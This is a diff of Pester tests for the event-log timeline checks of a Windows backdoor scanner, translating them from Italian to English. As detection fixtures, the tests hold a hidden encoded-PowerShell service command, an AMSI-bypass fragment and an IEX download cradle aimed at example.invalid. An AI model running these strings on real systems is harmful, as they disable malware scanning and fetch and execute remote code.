@@ -1,119 +1,120 @@
-# Linea temporale, con eventi finti costruiti come quelli letti dai registri di Windows.
-# I contenuti sospetti sono composti a runtime per non far bloccare il file da AMSI.
+# Timeline, with fake events built like the ones read from the Windows logs.
+# Suspicious content is assembled at runtime so AMSI does not block the file.
 
 BeforeAll {
     . "$PSScriptRoot\TestHelpers.ps1"
     . (Get-ModuleScript Common)
+    . (Get-ModuleScript CommandRisk)
     . (Get-ModuleScript Timeline)
 
     function New-Ev([int]$Id, [hashtable]$Data, [int]$DaysAgo = 1) {
         [pscustomobject]@{ Time = (Get-Date).AddDays(-$DaysAgo); Id = $Id; Data = $Data }
     }
     function Reset-Scan { $script:Findings.Clear(); $script:Timeline.Clear() }
-    function Get-TimelineFindings { @($script:Findings | Where-Object Category -eq 'Linea temporale') }
+    function Get-TimelineFindings { @($script:Findings | Where-Object Category -eq 'Timeline') }
 }
 
-Describe 'Servizi installati (7045)' {
+Describe 'Installed services (7045)' {
     BeforeEach { Reset-Scan }
-    It 'segna come Alto un servizio con PowerShell nascosto, installato e poi rimosso' {
+    It 'rates as High a service with hidden PowerShell, installed and then removed' {
         Mock Test-ServiceExists { $false }
         $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
         Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
         $f = @(Get-TimelineFindings)
         $f.Count | Should -Be 1
-        $f[0].Severity | Should -Be 'Alto'
-        $f[0].Title | Should -Match 'poi rimosso: ABCDEFG'
+        $f[0].Severity | Should -Be 'High'
+        $f[0].Title | Should -Match 'then removed: ABCDEFG'
         $script:Timeline[0].FindingId | Should -Be $f[0].Id
     }
-    It 'lascia al controllo dei servizi un servizio ancora installato' {
+    It 'leaves a service that is still installed to the services check' {
         Mock Test-ServiceExists { $true }
         $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
         Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
         Get-TimelineFindings | Should -BeNullOrEmpty
         $script:Timeline.Count | Should -Be 1
     }
-    It 'tralascia un driver firmato, anche se rimosso' {
+    It 'skips a signed driver, even if removed' {
         Mock Test-ServiceExists { $false }
         Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'Test'; ImagePath = '\SystemRoot\System32\drivers\null.sys' })
         Get-TimelineFindings | Should -BeNullOrEmpty
         $script:Timeline.Count | Should -Be 0
     }
-    It 'raggruppa un driver che si reinstalla a ogni avvio' {
+    It 'groups a driver that reinstalls itself at every boot' {
         Mock Test-ServiceExists { $true }
-        $d = @{ ServiceName = 'vpnfilter'; ImagePath = 'C:\nonesiste\vpnfilter.sys' }
+        $d = @{ ServiceName = 'vpnfilter'; ImagePath = 'C:\nonexistent\vpnfilter.sys' }
         Test-ServiceInstallEvents @((New-Ev 7045 $d 5), (New-Ev 7045 $d 3), (New-Ev 7045 $d 1))
         $script:Timeline.Count | Should -Be 1
-        $script:Timeline[0].Text | Should -Match '\(3 volte\)'
+        $script:Timeline[0].Text | Should -Match '\(3 times\)'
         ([datetime]$script:Timeline[0].Time).Date | Should -Be (Get-Date).AddDays(-1).Date
     }
 }
 
 Describe 'Microsoft Defender' {
     BeforeEach { Reset-Scan }
-    It 'riassume in una segnalazione le volte in cui la protezione e'' stata spenta' {
+    It 'sums up in one finding the times protection was turned off' {
         Test-DefenderEvents @((New-Ev 5001 @{} 3), (New-Ev 5001 @{} 1))
         $f = @(Get-TimelineFindings)
         $f.Count | Should -Be 1
-        $f[0].Severity | Should -Be 'Medio'
-        $f[0].Detail | Should -Match '^2 volte'
+        $f[0].Severity | Should -Be 'Medium'
+        $f[0].Detail | Should -Match '^2 times'
         $script:Timeline.Count | Should -Be 2
     }
-    It 'segna come Alto una minaccia che Defender non e'' riuscito a rimuovere' {
-        $p = 'file:_C:\nonesiste\crack.exe'
-        Test-DefenderEvents @((New-Ev 1116 @{ 'Threat Name' = 'Trojan:Win32/Prova'; Path = $p } 2), (New-Ev 1119 @{ 'Threat Name' = 'Trojan:Win32/Prova'; Path = $p } 2))
+    It 'rates as High a threat Defender could not remove' {
+        $p = 'file:_C:\nonexistent\crack.exe'
+        Test-DefenderEvents @((New-Ev 1116 @{ 'Threat Name' = 'Trojan:Win32/Test'; Path = $p } 2), (New-Ev 1119 @{ 'Threat Name' = 'Trojan:Win32/Test'; Path = $p } 2))
         $f = @(Get-TimelineFindings)
         $f.Count | Should -Be 1
-        $f[0].Severity | Should -Be 'Alto'
-        $f[0].Path | Should -Be 'C:\nonesiste\crack.exe'
+        $f[0].Severity | Should -Be 'High'
+        $f[0].Path | Should -Be 'C:\nonexistent\crack.exe'
     }
-    It 'segna come Basso una minaccia gia'' rimossa' {
-        Test-DefenderEvents @(New-Ev 1117 @{ 'Threat Name' = 'HackTool:Win32/Prova'; Path = 'file:_C:\nonesiste\keygen.exe'; 'Action Name' = 'Quarantena' })
-        (Get-TimelineFindings)[0].Severity | Should -Be 'Basso'
+    It 'rates as Low a threat already removed' {
+        Test-DefenderEvents @(New-Ev 1117 @{ 'Threat Name' = 'HackTool:Win32/Test'; Path = 'file:_C:\nonexistent\keygen.exe'; 'Action Name' = 'Quarantine' })
+        (Get-TimelineFindings)[0].Severity | Should -Be 'Low'
     }
-    It 'mette in linea temporale un''esclusione aggiunta, senza ripeterla come segnalazione' {
-        $new = 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Giochi = 0x0'
+    It 'puts an added exclusion in the timeline, without repeating it as a finding' {
+        $new = 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Games = 0x0'
         Test-DefenderEvents @(New-Ev 5007 @{ 'New Value' = $new; 'Old Value' = '' })
         Get-TimelineFindings | Should -BeNullOrEmpty
-        $script:Timeline[0].Path | Should -Be 'C:\Giochi'
-        $script:Timeline[0].Severity | Should -Be 'Medio'
+        $script:Timeline[0].Path | Should -Be 'C:\Games'
+        $script:Timeline[0].Severity | Should -Be 'Medium'
     }
 }
 
-Describe 'Account (4720, 4732)' {
+Describe 'Accounts (4720, 4732)' {
     BeforeEach { Reset-Scan }
-    It 'segnala un account creato' {
-        Test-AccountEvents @(New-Ev 4720 @{ TargetUserName = 'supporto'; SubjectUserName = 'bob' })
-        (Get-TimelineFindings)[0].Title | Should -Be 'Account creato: supporto'
+    It 'flags a created account' {
+        Test-AccountEvents @(New-Ev 4720 @{ TargetUserName = 'support'; SubjectUserName = 'bob' })
+        (Get-TimelineFindings)[0].Title | Should -Be 'Account created: support'
     }
-    It 'segnala un account aggiunto agli amministratori' {
-        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-544'; MemberName = 'CN=supporto'; SubjectUserName = 'bob' })
-        (Get-TimelineFindings)[0].Title | Should -Be 'Aggiunto agli amministratori: CN=supporto'
+    It 'flags an account added to the administrators' {
+        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-544'; MemberName = 'CN=support'; SubjectUserName = 'bob' })
+        (Get-TimelineFindings)[0].Title | Should -Be 'Added to administrators: CN=support'
     }
-    It 'ignora l''aggiunta ad altri gruppi' {
-        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-555'; MemberName = 'supporto' })
+    It 'ignores additions to other groups' {
+        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-555'; MemberName = 'support' })
         Get-TimelineFindings | Should -BeNullOrEmpty
     }
 }
 
-Describe 'Script PowerShell (4104)' {
+Describe 'PowerShell scripts (4104)' {
     BeforeAll {
         $amsi = '[Ref].Assembly.GetType(''System.Management.Automation.' + 'Ams' + 'iUtils'')'
-        $cradle = 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://esempio.invalid/a'')'
+        $cradle = 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://example.invalid/a'')'
     }
     BeforeEach { Reset-Scan }
-    It 'segna come Alto un tentativo di disattivare AMSI' {
+    It 'rates as High an attempt to disable AMSI' {
         Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $amsi })
-        (Get-TimelineFindings)[0].Severity | Should -Be 'Alto'
+        (Get-TimelineFindings)[0].Severity | Should -Be 'High'
     }
-    It 'tiene "da verificare" lo scaricamento con esecuzione, usato anche da installer legittimi' {
+    It 'keeps download-and-run "to review", since legitimate installers use it too' {
         Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle })
-        (Get-TimelineFindings)[0].Severity | Should -Be 'Medio'
+        (Get-TimelineFindings)[0].Severity | Should -Be 'Medium'
     }
-    It 'ignora gli script di CheckBackdoor' {
+    It 'ignores the CheckBackdoor scripts' {
         Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }) -OwnText "x`n$cradle`ny"
         Get-TimelineFindings | Should -BeNullOrEmpty
     }
-    It 'conta una volta lo stesso script e solo la prima parte di uno lungo' {
+    It 'counts the same script once and only the first part of a long one' {
         Test-PowerShellEvents -Events @(
             (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
             (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
@@ -122,46 +123,46 @@ Describe 'Script PowerShell (4104)' {
     }
 }
 
-Describe 'Programmi avviati (BAM)' {
-    It 'traduce percorso di dispositivo e data' {
+Describe 'Started programs (BAM)' {
+    It 'translates the device path and the date' {
         $when = Get-Date '2026-03-04 05:06:07'
         $bytes = [byte[]]([BitConverter]::GetBytes($when.ToFileTime()) + [byte[]](0) * 16)
         $e = ConvertFrom-BamValue -Name '\Device\HarddiskVolume3\Users\bob\a.exe' -Value $bytes -DriveMap @{ '\Device\HarddiskVolume3' = 'C:' }
         $e.Path | Should -Be 'C:\Users\bob\a.exe'
         $e.Time | Should -Be $when
     }
-    It 'scarta valori non binari e dispositivi sconosciuti' {
+    It 'drops non-binary values and unknown devices' {
         ConvertFrom-BamValue -Name 'Version' -Value 1 -DriveMap @{} | Should -BeNullOrEmpty
-        ConvertFrom-BamValue -Name '\Device\Rete\x.exe' -Value ([byte[]](1..16)) -DriveMap @{} | Should -BeNullOrEmpty
+        ConvertFrom-BamValue -Name '\Device\Network\x.exe' -Value ([byte[]](1..16)) -DriveMap @{} | Should -BeNullOrEmpty
     }
-    Context 'valutazione' {
+    Context 'rating' {
         BeforeAll {
             $dir = Join-Path $TestDrive 'Downloads'
             New-Item -ItemType Directory -Path $dir -Force | Out-Null
             $tool = Join-Path $dir 'tool.exe'
-            Set-Content -LiteralPath $tool -Value 'non firmato'
+            Set-Content -LiteralPath $tool -Value 'unsigned'
         }
         BeforeEach { Reset-Scan }
-        It 'segnala un programma non firmato avviato da una cartella utente' {
+        It 'flags an unsigned program started from a user folder' {
             Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
-            (Get-TimelineFindings)[0].Severity | Should -BeIn 'Alto', 'Medio'
+            (Get-TimelineFindings)[0].Severity | Should -BeIn 'High', 'Medium'
         }
-        It 'ignora gli avvii piu'' vecchi della finestra' {
+        It 'ignores starts older than the window' {
             Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-40) }) -Since (Get-Date).AddDays(-30)
             $script:Timeline.Count | Should -Be 0
         }
-        It 'mette solo in linea temporale un programma che non esiste piu''' {
-            Test-BamEntries -Entries @([pscustomobject]@{ Path = (Join-Path $dir 'sparito.exe'); Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
+        It 'only puts in the timeline a program that no longer exists' {
+            Test-BamEntries -Entries @([pscustomobject]@{ Path = (Join-Path $dir 'gone.exe'); Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
             Get-TimelineFindings | Should -BeNullOrEmpty
-            $script:Timeline[0].Text | Should -Match 'non esiste'
+            $script:Timeline[0].Text | Should -Match 'no longer exists'
         }
-        It 'non ripete un file gia'' segnalato da un altro controllo' {
-            $script:Findings.Add((New-TestFinding -Category 'File sospetti' -Path $tool))
+        It 'does not repeat a file already flagged by another check' {
+            $script:Findings.Add((New-TestFinding -Category 'Suspicious files' -Path $tool))
             Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
             Get-TimelineFindings | Should -BeNullOrEmpty
             $script:Timeline.Count | Should -Be 1
         }
-        It 'ignora i programmi installati in Program Files' {
+        It 'ignores programs installed in Program Files' {
             Test-BamEntries -Entries @([pscustomobject]@{ Path = "$env:ProgramFiles\App\app.exe"; Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
             $script:Timeline.Count | Should -Be 0
         }
